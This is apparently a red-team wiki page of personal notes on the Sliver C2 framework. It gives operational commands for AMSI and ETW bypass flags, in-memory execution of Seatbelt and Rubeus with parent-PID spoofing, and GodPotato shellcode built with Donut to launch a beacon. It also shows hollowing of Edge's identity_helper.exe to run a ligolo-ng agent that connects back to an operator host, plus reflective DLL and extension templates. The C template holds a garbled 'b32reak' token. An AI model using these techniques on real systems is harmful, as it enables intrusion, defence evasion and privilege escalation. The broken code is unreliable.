| 🏠 [Home](../../redteam.md) | ⬅️ ⬅️ [Part](../_part) | ⬅️ [Chapter](./_chapter) |
|-----------------------------|----------------------|-------------------------|


* [Builtin commands, aliases and extensions](../../red_team/sliver/commands_tools.md)
    * [Builtin commands](../../red_team/sliver/commands_tools.md#builtin-commands)
    * [Builtin execution commands](../../red_team/sliver/commands_tools.md#builtin-execution-commands)
        * [Introduction and common flags](../../red_team/sliver/commands_tools.md#introduction-and-common-flags)
        * [execute](../../red_team/sliver/commands_tools.md#execute)
        * [execute-assembly](../../red_team/sliver/commands_tools.md#execute-assembly)
        * [execute-shellcode](../../red_team/sliver/commands_tools.md#execute-shellcode)
        * [sideload](../../red_team/sliver/commands_tools.md#sideload)
        * [spawndll](../../red_team/sliver/commands_tools.md#spawndll)
    * [Extension](../../red_team/sliver/commands_tools.md#extensions)
        * [Extension introduction](../../red_team/sliver/commands_tools.md#extension-introduction)
        * [Writing an extension](../../red_team/sliver/commands_tools.md#writing-an-alias)
    * [Aliases)](../../red_team/sliver/commands_tools.md#aliases)
        * [Alias introduction](../../red_team/sliver/commands_tools.md#alias-introduction)
        * [Writing an Alias](../../red_team/sliver/commands_tools.md#writing-an-alias)
    * [Armory Mgt](../../red_team/sliver/commands_tools.md#armory-mgt)
    * [Donut](#donut)

# Builtin commands, aliases and extensions
## Builtin commands 

Common options:

* `-t <sec>`: timeout
* `--in-process`
* `--amsi-bypass`
* `--etw-bypass`
* `--save`: save ouput to disk
* `shell`: start an interactive shell
* `getsystem`: create a new beacon with `NT AUTHORITY\SYSTEM`
* `make-token`: create a token based on credentials
* `impersonate`: Impersonate a logged in user
* `download` and `upload` commands (when specifying a Windows
directory, we need to escape the backslash character) `upload pwn.exe C:\\temp\\pwn.exe`


## Builtin execution commands
### Opsec
It seems that defender is catching AMSI bypass
```
Behavior:Win32/AMSI_Patch_T.B12
behavior: process: C:\Windows\System32\rundll32.exe, pid:6236:1206935659933107
```

### Introduction and common flags
* `execute`: 
* `execute-assembly`: `.NET` binary or dll
* `execute-shellcode`: native executables in `Portable Executable`, both DLLs and EXEs
* `sideload`: **will always spawn a new, sacrificial process**
* `spawndll`: a sideload dedicated to **reflective dll** **will always spawn a new, sacrificial process**

* `--loot`
* `--save`


### `execute`

Execute a program on the remote system. Note that we must be cautious running the execute command as it will open a command prompt or the tool's GUI.
```bash
execute -o certutil.exe
# echo -en "whoami" | iconv -t UTF-16LE | base64 -w 0
execute -o powershell -e dwBoAG8AYQBtAGkA
```

### `execute-assembly`
 
** CATCHED BY DEFENDER RealtimeMonitoring** 

[execute-assembly](https://dominicbreuker.com/post/learning_sliver_c2_09_execute_assembly/) **allows us to run `.NET` binaries or DLL on the target machine, without touching the disk**. However, one caveat that `execute-assembly` has is it will spawn a child process. Except if `--in-process` is specified
```bash
    execute-assembly <flags> <local_path_to_file> <params>
```

There is also another downside when using the sacrificial process. Since it is using the Donut loader the command inherits the limitation that process **arguments cannot be longer than 256 characters**.

By default `execute-assembly` will spawn a `notepad.exe` process when we run any`.NET`binary. This can be changed using the `--process` and  specifying the process and even faking the parent process id (`-ppid`).

We must exercise most caution when executing tools within the Sliver session as defenders can easily look into the processes and deem it malicious. Because of the parent-child processses relationship or by looking into the `.Net` assemblies

The key takeaways that we get from those basic examples are:
* Exercise extreme caution as `notepad.exe` or any other process that we specify will appear as a managed process whereas it might need to be unmanaged. One example is the http-session.exe as there is no reason to start notepad.exe.
* Hardcoded strings such as Seatbelt that can be easily found in the process' memory.
* Certain API calls can appear as unusual for the process that you are injecting into.

```bash
execute-assembly --ppid 4272 --process calc.exe --loot --name seatbelt /tmp/ghostpack/Seatbelt.exe -group=All
execute-assembly --in-process --amsi-bypass --etw-bypass <local_path_to_file> <params>
# DLL
execute-assembly --class <class> --method <method> --in-process --amsi-bypass --etw-bypass <local_path_to_file> <params>
```

### `execute-shellcode`
** CATCHED BY DEFENDER RealtimeMonitoring** 

shellcode created by exemple with `donut` can't take any arguments 

```bash
# self process
execute-shellcode -p 5668 /home/htb-ac590/godpotato.bin
execute-assembly /home/htb-ac590/Rubeus.exe createnetonly /program:C:\\windows\\system32\\notepad.exe
execute-shellcode -p 5668 /home/htb-ac590/godpotato.bin

# another process (requiere privs)
execute-shellcode -p 5668 /home/htb-ac590/godpotato.bin
```

### `sideload`

**[sideload](https://dominicbreuker.com/post/learning_sliver_c2_10_sideload/) supports execution of native executables in `Portable Executable`, both DLLs and EXEs**

As `execute-assembly`, it use `Donut` to turn the payload into shellcode and then inject that into a process on the target machine. One difference is that `sideload` **will always spawn a new, sacrificial process**.

Creating a process from a PE file is easy if the file is on disk since Windows is obviously made for that. Creating one from a PE file in memory is not supported though. `Donut` solves this by implementing its own `PE loader` which recreates the Windows loader functionality (or at least the most important parts of it).


`identity_helper.exe` Enable PWA Integration with Windows Shell in Microsoft Edge
```bash
# dll
sideload --entry-point <entry_point> [flags] <filepath> [args...]
# exe
sideload  [flags] <filepath> [args...]
sideload -k --loot --process "C:\Program Files (x86)\Microsoft\Edge\Application\<version>\identity_helper.exe" /home/jubeaz/tmp/ligolo-ng-agent.exe -ignore-cert -connect 192.168.10.21:11601
sideload -k --loot --process "C:\Program Files (x86)\Microsoft\Edge\Application\142.0.3595.90\identity_helper.exe" /home/jubeaz/tmp/ligolo-ng-agent.exe -ignore-cert -connect 192.168.10.21:11601
# run winpeas (ne produit pas de sortie)
sideload -t 600 -s --process "C:\Program Files (x86)\Microsoft\Edge\Application\142.0.3595.90\identity_helper.exe" /opt/windows/windows_weaponize/bin/winPEASx86_ofs.exe 

```


### `spawndll`

[spawndll](https://dominicbreuker.com/post/learning_sliver_c2_11_spawndll/) is dedicated to **reflective dll**

[stephenfewer/ReflectiveDLLInjection](https://github.com/stephenfewer/ReflectiveDLLInjection)


```cpp
extern HINSTANCE hAppInstance;

BOOL APIENTRY DllMain(
  HINSTANCE hinstDLL,
	DWORD  dwReason,
	LPVOID lpReserved
)
{
	switch (dwReason)
	{
	  case DLL_QUERY_HMODULE:
		  if( lpReserved != NULL )
			  	*(HMODULE *)lpReserved = hAppInstance;
		  break;
	  case DLL_PROCESS_ATTACH:
		  hAppInstance = hinstDLL;
		  someFunction(3);
		  fflush(stdout);
		  b32reak;
	  case DLL_PROCESS_DETACH:
	  case DLL_THREAD_ATTACH:
	  case DLL_THREAD_DETACH:
      break;
	}
	return TRUE;
}

void someFunction(DWORD maxTries) {
  ...
}
```

## Extensions

### Extension introduction
An `extension` is a shared library that is reflectively loaded into the Sliver implant process, and is passed several callbacks to return data to the implant. As such these extensions must implement the Sliver API. They give us a way to run custom DLLs within the implant process, as if they were native capabilities built into the implant. See [Learning Sliver C2 (12) - Extensions](https://dominicbreuker.com/post/learning_sliver_c2_12_extensions/)

They are installed on the "sliver client-side"

A very interesting feature is that you can easily build extensions that support asynchronous interaction with long-running background processes.

### Writing an extension

To implement the sliver API two functions must be created:

* a `callback` used to communicate output to the implant: `typedef int (*goCallback)(char*, int)`
* an `entrypoint` to start the extension, to which you can give any name you like and which accepts a string of arguments, its length and the callback: `int <name>(char* argsBuffer, uint32_t bufferSize, goCallback callback)`

```bash
#mkdir -p  /home/jubeaz/.sliver-client/extensions/jubeaz  && cp *.dll /home/jubeaz/.sliver-client/extensions/jubeaz &&  cp extension.json /home/jubeaz/.sliver-client/extensions/jubeaz
extensions install /mnt/nfs/jubeaz/dev/windows_weaponize/extensions/x64/Release
extensions load /home/jubeaz/.sliver-client/extensions/jubeaz
# extensions install /mnt/nfs/jubeaz/dev/windows_weaponize/extensions/x64/Release/template.dll Execute
```

```cpp

typedef int (*goCallback)(char*, int);

struct Output {
	char* data;
	int len;
	goCallback callback;
};

int <communicate>(Output* output);

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	...
}

int <communicate>(Output* output)
{
	(*output).callback((*output).data, strlen((*output).data));
	free((*output).data);
	return 0;
}


extern "C" {
	__declspec(dllexport) int __cdecl Execute(char* argsBuffer, uint32_t bufferSize, goCallback callback);
}
int Execute(char* argsBuffer, uint32_t bufferSize, goCallback callback)
{
    ...
}
```

create a bundle:
```json
{
    "name": "...",
    "command_name": "PasswordPrompt",
    "version": "0.0.1",
    "extension_author": "...",
    "original_author": "...",
    "repo_url": "...",
    "help": "...",
    "entrypoint": "Execute",
    "files": [
        {
            "os": "windows",
            "arch": "386",
            "path": "....dll"
        },
        {
            "os": "windows",
            "arch": "amd64",
            "path": "....dll"
        }
    ]
}
```

## Aliases

### Alias introduction

### Introduction

An `alias` is essentially just a thin wrapper around the existing `sideload` and `execute-assembly` commands, and aliases cannot have `dependencies`.

They are installed on the "sliver client-side"

Arguments passed to`.NET`assemblies and non-reflective PE extensions are limited to 256 characters. This is due to a limitation in the Donut loader Sliver is using. A workaround for`.NET`assemblies is to execute them in-process, using the `--in-process` flag, or a custom BOF extension like `inline-execute-assembly`. There is currently no workaround for non-reflective PE extension.

A Sliver alias is nothing more than a folder inside
`~/.sliver-client/extensions/` or  `/.sliver-client/aliases/` with the
following structure:

-   an `alias.json` file

-   alias binaries in one of the following formats:`.NET`assemblies or
    shared libraries (`.so`, `.dll`, `.dylib`)

To load an alias in Sliver, use the `alias load` command:

    alias load /home/lesnuages/tools/misc/sliver-extensions/GhostPack/Rubeus

### Writing an Alias

make a folder somewhere with the binary and the `alias.json`

for exemple:
```json
{
  "name": "winPEAS",
  "version": "20251101-a416400b",
  "command_name": "winpeas",
  "original_author": "carlospolop",
  "repo_url": "https://github.com/peass-ng/PEASS-ng",
  "help": "Search for possible paths to escalate privileges on Windows hosts",
  "entrypoint": "Main",
  "allow_args": true,
  "default_args": "-h",
  "is_reflective": false,
  "is_assembly": true,
  "files": [
    {
      "os": "windows",
      "arch": "amd64",
      "path": "winPEASx64_ofs.exe"
    },
    {
      "os": "windows",
      "arch": "386",
      "path": "winPEASx86_ofs.exe"
    }
  ]
}
```

then run `aliases install <folder_absolut_path>`

restart or load `aliases load /home/jubeaz/.sliver-client/aliases/winpeas/alias.json`

## Armory Mgt
    armory
    armory install <soft>
    armory update

    # list aliases
    aliases
    # remove aliases
    aliases rm 
    # load aliases
    aliases load
    # install aliases
    aliases install


    # list extensions
    extensions
    # remove extensions
    extensions rm 
    # load extensions
    extensions load
    # install extensions
    extensions install

## Donut

[Donut](https://github.com/TheWover/donut) is a tool focused on creating
binary shellcodes that can be executed in memory; Donut will generate a
shellcode of a`.NET` binary, which can be executed via the
`execute-shellcode` argument in Sliver.

To take advantage of Donut, we would need to create either an http or
mtls beacon(s) beforehand.

To generate the binary shellcode using Donut, we are going to be using
the arguments `-a 2` responsible for choosing the architecture
(`2 = amd64`), the `-b 2` responsible for bypassing AMSI/WLDP/ETW
(`2 = Abort on fail`), `-p` followed by the arguments that are going to
be run from GodPotato and the `-o` to specify the output directory and
the name of the shellcode.

```bash
git clone https://github.com/TheWover/donut
cd donut/
make -f Makefile
./donut 


./donut -i ./GodPotato-NET4.exe -a 2 -b 2 -p '-cmd c:\temp\http-beacon.exe' -o ./godpotato.bin
```
To continue and use the execute-shellcode in memory, we would have to
create a sacrificial process of `notepad.exe` using `Rubeus.exe`
(previously downloaded from SharpCollection). Creating a sacrificial
process will enable us to not intervene with other processes that might
be crucial to the organization as they might crash.

```bash
execute-assembly /home/htb-ac590/Rubeus.exe createnetonly /program:C:\\windows\\system32\\notepad.exe
execute-shellcode -p 5668 /home/htb-ac590/godpotato.bin
```